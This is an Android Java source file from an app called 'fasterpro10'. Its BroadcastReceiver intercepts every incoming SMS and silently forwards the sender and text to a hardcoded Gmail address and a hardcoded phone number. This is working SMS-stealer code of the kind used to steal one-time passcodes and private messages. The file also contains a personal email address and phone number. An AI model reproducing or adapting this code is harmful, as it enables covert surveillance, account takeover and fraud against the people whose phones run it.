package com.example.fasterpro10;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import javax.mail.MessagingException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS from: " + sender + ", message: " + messageBody);

                    executorService.execute(() -> {
                        try {
                            forwardSmsByEmail(sender, messageBody);
                            forwardSmsToNumber(sender, messageBody);
                        } catch (MessagingException e) {
                            Log.e(TAG, "Failed to forward SMS: " + e.getMessage());
                            e.printStackTrace();
                        }
                    });
                }
            }
        }
    }

    private void forwardSmsByEmail(String sender, String messageBody) throws MessagingException {
        JavaMailAPI.sendMail("babulahmed000015@gmail.com", "SMS Forwarded", "From: " + sender + "\n" + messageBody);
        Log.d(TAG, "SMS forwarded successfully via email");
    }

    private void forwardSmsToNumber(String sender, String messageBody) {
        String recipientNumber = "+8801748937893";
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(recipientNumber, null, "From: " + sender + "\n" + messageBody, null, null);
        Log.d(TAG, "SMS forwarded successfully to: " + recipientNumber);
    }
}
